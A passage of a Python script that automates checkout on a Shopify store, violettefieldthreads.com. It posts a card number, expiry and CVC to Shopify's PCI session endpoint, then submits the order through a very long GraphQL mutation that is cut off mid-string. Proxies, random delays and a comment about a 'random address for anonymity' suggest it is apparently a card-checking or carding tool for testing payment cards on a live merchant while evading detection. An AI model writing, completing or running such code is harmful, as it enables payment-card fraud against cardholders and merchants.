    if not all([x, queue_token, stableid, paymentmethodidentifier]):
        return "Failed at step 3: Could not extract required tokens from cart page."

    random_delay(0.3, 0.7)  # Minimal delay

    # Step 4: PCI session
    print("Step 4: Creating PCI session...")
    headers = {
        'authority': 'checkout.pci.shopifyinc.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://checkout.pci.shopifyinc.com',
        'referer': 'https://checkout.pci.shopifyinc.com/build/d3eb175/number-ltr.html?identifier=&locationURL=',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'active',
        'user-agent': user_agent,
    }
    json_data = {
        'credit_card': {
            'number': cc,
            'month': mm,
            'year': yy,
            'verification_value': cvc,
            'start_month': None,
            'start_year': None,
            'issue_number': '',
            'name': f'{rfirst} {rlast}',
        },
        'payment_session_scope': 'violettefieldthreads.com',
    }
    response = session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, proxies=proxy if proxy else None)
    random_delay(0.2, 0.5)
    try:
        sid = response.json()['id']
        print(f"PCI Session ID: {sid}")
    except (json.JSONDecodeError, KeyError):
        print(f"PCI Response: {response.text[:200]}")
        return "Failed at step 4: Could not get payment session ID"

    random_delay(0.3, 0.7)  # Minimal delay
    #---------×Posting_To_cart_page×----------#
    
    
    #------------×Submitt_For_Checkout×-----------#
    print("Step 5: Submitting for completion...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/json',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/',
        'sec-fetch-site': 'same-origin',
        'shopify-checkout-client': 'checkout-web/1.0',
        'user-agent': user_agent,
        'x-checkout-one-session-token': x,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
    }
    params = {
        'operationName': 'SubmitForCompletion',
    }
    # Use random address in submission for anonymity
    json_data = {
        'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on RedirectRequiredViolation{target details __typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}paymentIcon __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}finalizedRemoteCheckouts{...FinalizedRemoteCheckoutsResult __typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id pollDelay remoteCheckouts{...on SubmittingRemoteCheckout{shopId __typename}...on SubmittedRemoteCheckout{shopId __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment FinalizedRemoteCheckoutsResult on FinalizedRemoteCheckout{shopId result{...on ProcessedRemoteReceipt{orderIdentity{buyerIdentifier id __typename}orderStatusPageUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}payment{paymentLines{amount{amount currencyCode __typename}__typename}__typename}delivery{deliveryLines{deliveryStrategy{handle title __typename}lineAmount{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on FailedRemoteReceipt{recoveryUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}cartMetafields{...on CartMetafieldUpdateOperation{key namespace value type appId namespaceAppId valueType __typename}...on CartMetafieldDeleteOperation{key namespace appId __typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded bwpItems merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}remote{consolidated{totals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms deliveryPredictionEligible brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment ParentMerchandiseLine on MerchandiseLine{stableId lineAllocations{stableId __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on 